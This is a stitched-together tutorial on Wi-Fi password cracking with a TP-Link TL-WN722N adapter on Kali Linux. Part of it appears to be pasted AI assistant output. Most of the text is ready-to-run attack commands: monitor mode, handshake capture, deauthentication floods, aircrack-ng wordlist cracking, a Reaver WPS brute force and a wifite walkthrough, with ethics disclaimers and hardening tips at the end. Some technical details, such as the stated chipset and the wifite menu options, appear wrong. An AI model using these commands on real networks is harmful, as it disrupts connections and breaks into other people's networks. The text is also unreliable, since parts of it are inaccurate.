# TP-Link TL-WN722N USB Wi-Fi Adapter for Penetration Testing

## **Overview**
This guide explains how to use the **TP-Link TL-WN722N USB Wi-Fi adapter** for penetration testing with **Kali Linux**. It covers installation, configuration, network settings for VMs, and ethical considerations.

## **Prerequisites**
- **TP-Link TL-WN722N USB Wi-Fi Adapter** (with **Atheros AR9287 chipset**).
- **Kali Linux** (installed on a physical machine or Virtual Machine).
- **Aircrack-ng Suite** (for wireless network auditing).
- **Reaver** (for WPS brute-force attacks).

---

## **Network Settings for Virtual Machines**
If using Kali Linux in **VirtualBox or VMware**, you must **attach the USB Wi-Fi adapter directly to the VM** instead of using NAT or Bridged Adapter.

### **For VirtualBox:**
1. **Plug in the TP-Link TL-WN722N Adapter** to your computer.
2. **Start VirtualBox** (but do not start the Kali Linux VM yet).
3. **Go to VirtualBox Settings** → `USB`.
4. **Enable USB Controller**:
   - Select `USB 2.0 (EHCI) Controller` (install the VirtualBox Extension Pack if required).
5. **Add the USB device**:
   - Click the `+` icon and select **TP-Link TL-WN722N** from the list.
6. **Start your Kali Linux VM**.
7. **Verify the adapter is recognized** by running:
   ```bash
   lsusb
   ```
   Look for an entry like `Atheros Communications, Inc.`.
8. **Check if it appears as a network interface**:
   ```bash
   iwconfig
   ```
   If you see `wlan0` or `wlan1`, your adapter is detected.

### **For VMware Workstation/Player:**
1. **Plug in the TP-Link TL-WN722N Adapter**.
2. **Start VMware Workstation** (but do not start the Kali Linux VM yet).
3. **Go to** `VM` → `Removable Devices` → `TP-Link TL-WN722N`.
4. **Select** `Connect (Disconnect from Host)`.
5. **Start your Kali Linux VM**.
6. **Verify the adapter is recognized**:
   ```bash
   lsusb
   iwconfig
   ```

---

## **Step-by-Step Process**
### **1. Install Kali Linux**
If you haven't already, [download and install Kali Linux](https://www.kali.org/get-kali/) from the official website.

### **2. Install Necessary Drivers**
The TP-Link TL-WN722N adapter uses the **Atheros AR9287 chipset**, supported by the `ath9k` driver in Linux.
```bash
sudo apt update
sudo apt install firmware-atheros
```

### **3. Connect the TP-Link TL-WN722N Adapter**
Simply plug the adapter into a **USB port** on your Kali Linux machine.

### **4. Verify the Adapter is Recognized**
Run the following command:
```bash
iwconfig
```
You should see an interface like `wlan0` or `wlan1`.

### **5. Put the Adapter in Monitor Mode**
```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### **6. Scan for Available Networks**
```bash
sudo airodump-ng wlan0
```
This will display a list of available networks.

### **7. Capture Handshake**
```bash
sudo airodump-ng --bssid <BSSID> --channel <CHANNEL> --write capture wlan0
```
Replace `<BSSID>` with the target network's BSSID and `<CHANNEL>` with the channel number.

### **8. Deauthenticate Clients**
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0
```
This will force clients to disconnect and reconnect, allowing you to capture the handshake.

### **9. Crack the WPA/WPA2 Password**
```bash
sudo aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap
```
Replace `/path/to/wordlist.txt` with your actual wordlist file and `<BSSID>` with the target BSSID.

### **10. Alternative: Attack WPS (Wi-Fi Protected Setup)**
```bash
sudo reaver -i wlan0 -b <BSSID> -vv
```

---

## **Important Notes**
### **Legal and Ethical Considerations**
- **Unauthorized penetration testing is illegal**. Always obtain **explicit permission** before testing any network.
- **Use these techniques only for educational and security assessment purposes**.
- **Hacking unauthorized networks can lead to severe legal consequences.**

### **Security Measures to Protect Your Own Network**
- Use **WPA3 or strong WPA2 encryption**.
- Set **complex passwords** and update them regularly.
- **Disable WPS (Wi-Fi Protected Setup)** to prevent brute-force attacks.
- Regularly **update your router firmware** to patch security vulnerabilities.

---

By following these steps, you can ethically test the security of your own Wi-Fi network and identify potential vulnerabilities. **Always prioritize legal and ethical considerations in your penetration testing activities.**

---

### **Disclaimer**
This guide is for **educational purposes only**. The author is **not responsible** for any misuse of this information. Always obtain **legal authorization** before performing penetration testing on any network.


-------------------------------

## **💀 Wifite**
Using `wifite` is a good choice for automated Wi-Fi cracking, but it's important to note that cracking Wi-Fi passwords without authorization is illegal and unethical. Since you mentioned that you are authorized to test the security of the assets, I'll provide you with the steps to use `wifite` to crack the password of a Wi-Fi network using a TP-Link TL-WN722N v2/v3 with the Realtek RTL8188EUS chipset.

Here are the steps:

1. **Install `wifite`**:
   First, you need to install `wifite` on your system. You can do this using the following commands:

   ```bash
   sudo apt update
   sudo apt install git
   git clone https://github.com/derv82/wifite.git
   cd wifite
   sudo python3 setup.py install
   ```

2. **Install Required Dependencies**:
   `wifite` requires several dependencies to function properly. You can install them using:

   ```bash
   sudo apt install python3-pip
   sudo pip3 install -r requirements.txt
   ```

3. **Start `wifite`**:
   Once `wifite` is installed, you can start it by running:

   ```bash
   sudo wifite
   ```

4. **Select the Target Network**:
   `wifite` will scan for available Wi-Fi networks. Select the target network by entering the corresponding number.

5. **Choose the Attack Method**:
   `wifite` supports various attack methods. For a TP-Link TL-WN722N v2/v3 with the Realtek RTL8188EUS chipset, you can use the following methods:

   - **Deauth Attack**: This method sends deauthentication packets to force clients to reconnect, capturing the handshake.
   - **WPS Attack**: If the target network has WPS enabled, you can use a WPS attack to retrieve the password.

   To perform a deauth attack, select option `1` (Deauth Attack) when prompted.

6. **Capture the Handshake**:
   `wifite` will automatically capture the handshake once a client reconnects. You can then use the captured handshake to crack the password.

7. **Crack the Password**:
   After capturing the handshake, `wifite` will attempt to crack the password using a wordlist. You can specify a custom wordlist if needed.

   ```bash
   sudo wifite --wordlist /path/to/your/wordlist.txt
   ```

8. **Monitor Progress**:
   `wifite` will display the progress of the cracking attempt. Once the password is cracked, it will be displayed on the screen.

Remember, these steps are for educational purposes only and should only be performed on networks for which you have explicit permission to test.

If you encounter any issues or need further assistance, feel free to ask!

----
📌💀

Here is a step-by-step example:
# Update package list and install wifite
sudo apt update
sudo apt install wifite

# Run wifite
sudo wifite

# Inside wifite, select the target network and attack method
# For example, if the target network is number 1 and you choose WPA attack:
# 1
# 2 (for WPA attack)

# If you need to specify a wordlist, you can do so when prompted
# For example, if the wordlist is /usr/share/wordlists/rockyou.txt:
# /usr/share/wordlists/rockyou.txt

# To store the password in a text file, redirect the output:
sudo wifite | tee cracked_password.txt